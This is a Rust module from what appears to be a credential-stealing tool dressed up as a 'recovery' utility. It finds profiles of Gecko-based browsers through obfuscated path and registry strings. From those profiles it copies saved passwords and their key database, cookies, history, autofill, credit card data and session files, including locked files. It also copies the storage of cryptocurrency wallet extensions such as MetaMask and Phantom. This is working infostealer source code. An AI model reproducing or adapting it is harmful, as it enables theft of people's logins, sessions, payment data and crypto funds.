use crate::recovery::helpers::obfuscation::deobf;
use crate::recovery::{
    context::RecoveryContext,
    fs::copy_dir_limited,
    task::{RecoveryArtifact, RecoveryCategory, RecoveryError, RecoveryTask},
};
use async_trait::async_trait;
use once_cell::sync::Lazy;
use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tracing::{debug, warn};
use winreg::{
    RegKey,
    enums::{HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE},
};

static GECKO_BROWSERS: Lazy<Vec<(&'static str, String)>> = Lazy::new(|| {
    vec![
        (
            "Firefox",
            deobf(&[
                0x91, 0xD2, 0xDF, 0xDB, 0xD2, 0xDB, 0x90, 0xAC, 0xD4, 0xCE, 0xD8, 0xCA, 0xCE, 0xDB,
            ]),
        ),
        (
            "SeaMonkey",
            deobf(&[
                0x91, 0xD2, 0xDF, 0xDB, 0xD2, 0xDB, 0x90, 0xAC, 0x90, 0xD8, 0xDC, 0x8E, 0xCE, 0xDB,
                0xCA, 0xD8, 0xC4,
            ]),
        ),
        (
            "Waterfox",
            deobf(&[0x94, 0xD2, 0xD3, 0xD8, 0xCF, 0xDA, 0xD2, 0xDB]),
        ),
        (
            "LibreWolf",
            // "LibreWolf/Profiles" or "LibreWolf"
            deobf(&[0x9B, 0xD2, 0xBF, 0xCD, 0xDA, 0x90, 0xD2, 0xDB, 0x91]),
        ),
        (
            "Pale Moon",
            deobf(&[
                0x8E, 0xD2, 0xD2, 0xCF, 0xDA, 0xCB, 0xD4, 0xDB, 0xD3, 0xE1, 0x93, 0xCF, 0xD2, 0xD3,
                0xC8, 0xDA, 0xD3, 0xD4, 0xCE, 0xCF, 0x90, 0x91, 0xA5, 0xD2, 0xDB, 0xD8, 0xE1, 0x91,
                0xD2, 0xDB, 0xD8, 0x90, 0xCE, 0xD2, 0xCE, 0xCF,
            ]),
        ),
    ]
});

static GECKO_INSTALL_REGISTRY: Lazy<Vec<(&'static str, Vec<String>)>> = Lazy::new(|| {
    vec![
        (
            "Firefox",
            vec![
                deobf(&[
                    0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x91, 0xD2, 0xDF, 0xDB,
                    0xD2, 0xDB, 0xE1, 0x91, 0xD2, 0xDF, 0xDB, 0xD2, 0xDB, 0xA5, 0xD4, 0xCF, 0xD8,
                    0xCA, 0xCE, 0xDB,
                ]),
                deobf(&[
                    0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x94, 0xAC, 0x94, 0xB7,
                    0xB3, 0xB0, 0xB3, 0xA1, 0xD2, 0xDB, 0xD8, 0xE1, 0x91, 0xD2, 0xDF, 0xDB, 0xD2,
                    0xDB, 0xE1, 0x91, 0xD2, 0xDF, 0xDB, 0xD2, 0xDB, 0xA5, 0xD4, 0xCF, 0xD8, 0xCA,
                    0xCE, 0xDB,
                ]),
            ],
        ),
        (
            "LibreWolf",
            vec![
                deobf(&[
                    0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x9B, 0xD2, 0xBF, 0xCD,
                    0xDA, 0x90, 0xD2, 0xDB, 0x91,
                ]),
            ],
        ),
        (
            "SeaMonkey",
            vec![
                deobf(&[
                    0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x91, 0xD2, 0xDF, 0xDB,
                    0xD2, 0xDB, 0xE1, 0x90, 0xD8, 0xDC, 0x8E, 0xCE, 0xDB, 0xCA, 0xD8, 0xC4,
                ]),
                deobf(&[
                    0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x94, 0xAC, 0x94, 0xB7,
                    0xB3, 0xB0, 0xB3, 0xA1, 0xD2, 0xDB, 0xD8, 0xE1, 0x91, 0xD2, 0xDF, 0xDB, 0xD2,
                    0xDB, 0xE1, 0x90, 0xD8, 0xDC, 0x8E, 0xCE, 0xDB, 0xCA, 0xD8, 0xC4,
                ]),
            ],
        ),
        (
            "Waterfox",
            vec![
                deobf(&[
                    0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x94, 0xD2, 0xD3, 0xD8,
                    0xCF, 0xDA, 0xD2, 0xDB, 0xEE, 0x8F, 0xCE, 0xD3, 0xE1, 0x94, 0xD2, 0xD3, 0xD8,
                    0xCF, 0xDA, 0xD2, 0xDB,
                ]),
                deobf(&[
                    0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x94, 0xAC, 0x94, 0xB7,
                    0xB3, 0xB0, 0xB3, 0xA1, 0xD2, 0xDB, 0xD8, 0xE1, 0x94, 0xD2, 0xD3, 0xD8, 0xCF,
                    0xDA, 0xD2, 0xDB, 0xEE, 0x8F, 0xCE, 0xD3, 0xE1, 0x94, 0xD2, 0xD3, 0xD8, 0xCF,
                    0xDA, 0xD2, 0xDB,
                ]),
            ],
        ),
        (
            "Pale Moon",
            vec![
                deobf(&[
                    0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x8E, 0xD2, 0xD2, 0xCF,
                    0xDA, 0xCB, 0xD4, 0xDB, 0xD3, 0xE1, 0x93, 0xCF, 0xD2, 0xD3, 0xC8, 0xDA, 0xD3,
                    0xD4, 0xCE, 0xCF, 0x90, 0x91, 0xA5, 0xD2, 0xDB, 0xD8, 0xE1, 0x91, 0xD2, 0xDB,
                    0xD8, 0x90, 0xCE, 0xD2, 0xCE, 0xCF,
                ]),
                deobf(&[
                    0x90, 0xAC, 0x85, 0x97, 0x94, 0x82, 0x91, 0x86, 0xE1, 0x94, 0xAC, 0x94, 0xB7,
                    0xB3, 0xB0, 0xB3, 0xA1, 0xD2, 0xDB, 0xD8, 0xE1, 0x8E, 0xD2, 0xD2, 0xCF, 0xDA,
                    0xCB, 0xD4, 0xDB, 0xD3, 0xE1, 0x93, 0xCF, 0xD2, 0xD3, 0xC8, 0xDA, 0xD3, 0xD4,
                    0xCE, 0xCF, 0x90, 0x91, 0xA5, 0xD2, 0xDB, 0xD8, 0xE1, 0x91, 0xD2, 0xDB, 0xD8,
                    0x90, 0xCE, 0xD2, 0xCE, 0xCF,
                ]),
            ],
        ),
    ]
});

const TARGET_EXTENSIONS: &[(&str, &str)] = &[
    ("MetaMask", "webextension@metamask.io"),
    ("Phantom", "phantom-app@ghost"),
    ("Ronin Wallet", "ronin-wallet@axielabs.com"),
    ("Exodus Web3", "exodus-web3-wallet@exodus.com"),
    ("Coinbase Wallet", "coinbase-wallet-extension@coinbase.com"),
    ("Trust Wallet", "trust-wallet-extension@trustwallet.com"),
];

pub fn gecko_tasks(ctx: &RecoveryContext) -> Vec<Arc<dyn RecoveryTask>> {
    let mut tasks: Vec<Arc<dyn RecoveryTask>> = Vec::new();
    let profiles = match discover_gecko_profiles(ctx) {
        Ok(list) => list,
        Err(err) => {
            debug!(error=?err, "failed to gather Gecko profiles");
            Vec::new()
        }
    };

    for profile in profiles {
        for kind in GeckoDataKind::all().iter() {
            let task: Arc<dyn RecoveryTask> = Arc::new(GeckoRecoveryTask {
                profile: profile.clone(),
                kind: *kind,
            });
            tasks.push(task);
        }
        tasks.push(Arc::new(GeckoExtensionTask {
            profile: profile.clone(),
        }));
    }

    tasks
}

#[derive(Clone)]
pub struct GeckoProfile {
    pub browser: &'static str,
    pub profile_name: String,
    pub path: PathBuf,
    pub install_dir: Option<PathBuf>,
}

#[derive(Clone, Copy)]
enum GeckoDataKind {
    Passwords,
    History,
    Bookmarks,
    Cookies,
    Autofill,
    CreditCards,
    Sessions,
}

impl GeckoDataKind {
    const fn all() -> [Self; 7] {
        [
            Self::Passwords,
            Self::History,
            Self::Bookmarks,
            Self::Cookies,
            Self::Autofill,
            Self::CreditCards,
            Self::Sessions,
        ]
    }

    const fn label(&self) -> &'static str {
        match self {
            Self::Passwords => "Passwords",
            Self::History => "History",
            Self::Bookmarks => "Bookmarks",
            Self::Cookies => "Cookies",
            Self::Autofill => "Autofill",
            Self::CreditCards => "Credit Cards",
            Self::Sessions => "Sessions",
        }
    }

    const fn file_names(&self) -> &'static [&'static str] {
        match self {
            Self::Passwords => &["logins.json", "key4.db"],
            Self::History => &["places.sqlite"],
            Self::Bookmarks => &["places.sqlite"],
            Self::Cookies => &["cookies.sqlite"],
            Self::Autofill => &["formhistory.sqlite"],
            Self::CreditCards => &["formhistory.sqlite"],
            Self::Sessions => &["sessionstore.jsonlz4", "sessionstore-backups/recovery.jsonlz4"],
        }
    }
}

struct GeckoRecoveryTask {
    profile: GeckoProfile,
    kind: GeckoDataKind,
}

fn gecko_process_name(browser: &str) -> &'static str {
    match browser {
        "Firefox" => "firefox.exe",
        "SeaMonkey" => "seamonkey.exe",
        "Waterfox" => "waterfox.exe",
        "LibreWolf" => "librewolf.exe",
        "Pale Moon" => "palemoon.exe",
        _ => "firefox.exe",
    }
}

#[async_trait]
impl RecoveryTask for GeckoRecoveryTask {
    fn label(&self) -> String {
        format!(
            "{browser}/{profile} - {kind}",
            browser = self.profile.browser,
            profile = self.profile.profile_name,
            kind = self.kind.label()
        )
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Browsers
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        for file_name in self.kind.file_names().iter() {
            let candidate = self.profile.path.join(file_name);
            match std::fs::metadata(&candidate) {
                Ok(metadata) if metadata.is_file() => {
                    let mut final_path = candidate.clone();

                    if matches!(
                        self.kind,
                        GeckoDataKind::Cookies | GeckoDataKind::History | GeckoDataKind::Passwords | GeckoDataKind::Sessions
                    ) {
                        let temp_dir = ctx.output_dir.join("browsers").join(self.profile.browser);
                        let _ = std::fs::create_dir_all(&temp_dir);
                        let dest = temp_dir.join(format!(
                            "{}_{}_{}",
                            self.profile.profile_name,
                            self.kind.label(),
                            file_name
                        ));

                        if super::lockedfile::copy_locked_file(
                            gecko_process_name(self.profile.browser),
                            &candidate,
                            &dest,
                        ) {
                            final_path = dest;
                        }
                    }

                    if let Ok(new_metadata) = std::fs::metadata(&final_path) {
                        artifacts.push(RecoveryArtifact {
                            label: self.kind.label().to_string(),
                            path: final_path,
                            size_bytes: new_metadata.len(),
                            modified: new_metadata.modified().ok(),
                        });
                    }
                }
                Ok(_) => {
                    debug!(path=?candidate, "expecting file but found directory");
                }
                Err(err) => {
                    debug!(path=?candidate, error=?err, "missing gecko artifact");
                }
            }
        }

        Ok(artifacts)
    }
}

struct GeckoExtensionTask {
    profile: GeckoProfile,
}

#[async_trait]
impl RecoveryTask for GeckoExtensionTask {
    fn label(&self) -> String {
        format!(
            "{browser}/{profile} - Extensions",
            browser = self.profile.browser,
            profile = self.profile.profile_name
        )
    }

    fn category(&self) -> RecoveryCategory {
        RecoveryCategory::Wallets
    }

    async fn run(&self, ctx: &RecoveryContext) -> Result<Vec<RecoveryArtifact>, RecoveryError> {
        let mut artifacts = Vec::new();
        let storage_dir = self.profile.path.join("storage").join("default");

        if !storage_dir.exists() {
            return Ok(artifacts);
        }

        let uuid_map = resolve_extension_uuids(&self.profile.path);

        for (name, id) in TARGET_EXTENSIONS {
            if let Some(uuid) = uuid_map.get(*id) {
                let folder_name = format!("moz-extension+++{}", uuid);
                let extension_dir = storage_dir.join(folder_name);

                if extension_dir.exists() {
                    let dest_root = ctx
                        .output_dir
                        .join("services")
                        .join("Wallets")
                        .join(format!(
                            "{}_{}_{}",
                            self.profile.browser, self.profile.profile_name, name
                        ));
                    let _ = std::fs::create_dir_all(&dest_root);

                    match copy_dir_limited(
                        &extension_dir,
                        &dest_root,
                        name,
                        &mut artifacts,
                        usize::MAX,
                        0,
                    )
                    .await
                    {
                        Ok(_) => debug!(extension=?name, "recovered gecko extension data"),
                        Err(err) => {
                            warn!(extension=?name, error=?err, "failed to recover gecko extension")
                        }
                    }
                }
            }
        }

        Ok(artifacts)
    }
}

fn resolve_extension_uuids(profile_path: &Path) -> HashMap<String, String> {
    let mut map = HashMap::new();
    let prefs_path = profile_path.join("prefs.js");

    if let Ok(content) = std::fs::read_to_string(prefs_path) {
        for line in content.lines() {
            let line = line.trim();
            if line.starts_with("user_pref(\"extensions.webextensions.uuids\",") {
                if let Some(start) = line.find("\"{") {
                    if let Some(end) = line.rfind("}\"") {
                        let json_str = &line[start + 1..end + 1];
                        let json_clean = json_str.replace("\\\"", "\"");

                        if let Ok(parsed) =
                            serde_json::from_str::<HashMap<String, String>>(&json_clean)
                        {
                            map.extend(parsed);
                        }
                    }
                }
            }
        }
    }

    map
}

pub fn discover_gecko_profiles(ctx: &RecoveryContext) -> Result<Vec<GeckoProfile>, RecoveryError> {
    let mut profiles = Vec::new();
    let mut seen = HashSet::new();
    let app_data = ctx.roaming_data_dir.clone();
    let install_map = find_install_paths();

    for (browser, relative) in GECKO_BROWSERS.iter() {
        let trimmed = relative.trim_end_matches("\\").trim_end_matches('/');
        let browser_dir = app_data.join(trimmed);
        let ini_path = browser_dir.join("profiles.ini");
        if !ini_path.exists() {
            continue;
        }

        let entries = parse_profiles_ini(&ini_path)?;
        for entry in entries {
            if let Some(resolved) =
                resolve_profile_path(&browser_dir, &entry.path, entry.is_relative)
            {
                let canonical = resolved.to_string_lossy().to_string();
                if !seen.insert(canonical.clone()) {
                    continue;
                }

                let profile_name = entry.name.clone().unwrap_or_else(|| {
                    resolved
                        .file_name()
                        .map(|name| name.to_string_lossy().to_string())
                        .unwrap_or_else(|| "profile".into())
                });

                profiles.push(GeckoProfile {
                    browser,
                    profile_name,
                    path: resolved,
                    install_dir: install_map.get(browser).cloned(),
                });
            }
        }
    }

    Ok(profiles)
}

fn find_install_paths() -> HashMap<&'static str, PathBuf> {
    let mut paths = HashMap::new();
    for (browser, keys) in GECKO_INSTALL_REGISTRY.iter() {
        if let Some(path) = locate_install_path(keys) {
            paths.insert(*browser, path);
        }
    }
    paths
}

fn locate_install_path(keys: &[String]) -> Option<PathBuf> {
    for root in [HKEY_LOCAL_MACHINE, HKEY_CURRENT_USER] {
        for key_path in keys {
            if let Ok(key) = RegKey::predef(root).open_subkey(key_path) {
                if let Ok(version) = key.get_value::<String, _>("CurrentVersion") {
                    let main_path = format!(r"{}\Main", version);
                    if let Ok(main_key) = key.open_subkey(&main_path) {
                        if let Ok(dir) = main_key.get_value::<String, _>("Install Directory") {
                            let directory = PathBuf::from(dir);
                            if directory.exists() {
                                return Some(directory);
                            }
                        }
                    }
                }
            }
        }
    }
    None
}

struct ProfileEntry {
    name: Option<String>,
    path: String,
    is_relative: bool,
}

fn resolve_profile_path(base: &Path, profile_path: &str, is_relative: bool) -> Option<PathBuf> {
    let normalized = profile_path.replace('/', "\\");
    if is_relative {
        Some(base.join(normalized))
    } else {
        Some(PathBuf::from(normalized))
    }
}

fn parse_profiles_ini(path: &Path) -> Result<Vec<ProfileEntry>, RecoveryError> {
    let content = std::fs::read_to_string(path)?;
    let lines: Vec<&str> = content.lines().map(str::trim).collect();
    let mut entries = Vec::new();
    let mut idx = 0;

    while idx < lines.len() {
        let line = lines[idx];
        if line.starts_with('[')
            && (line.to_lowercase().starts_with("[profile")
                || line.to_lowercase().starts_with("[install"))
        {
            let mut name = None;
            let mut profile_path = None;
            let mut is_relative = true;
            idx += 1;

            while idx < lines.len() && !lines[idx].starts_with('[') {
                let entry = lines[idx];
                if entry.starts_with("Name=") {
                    name = Some(entry["Name=".len()..].to_string());
                } else if entry.starts_with("Path=") {
                    profile_path = Some(entry["Path=".len()..].to_string());
                } else if entry.starts_with("IsRelative=") {
                    is_relative = entry["IsRelative=".len()..].trim() == "1";
                } else if entry.starts_with("Default=") && profile_path.is_none() {
                    profile_path = Some(entry["Default=".len()..].to_string());
                }
                idx += 1;
            }

            if let Some(path) = profile_path {
                entries.push(ProfileEntry {
                    name,
                    path,
                    is_relative,
                });
            }
            continue;
        }
        idx += 1;
    }

    Ok(entries)
}
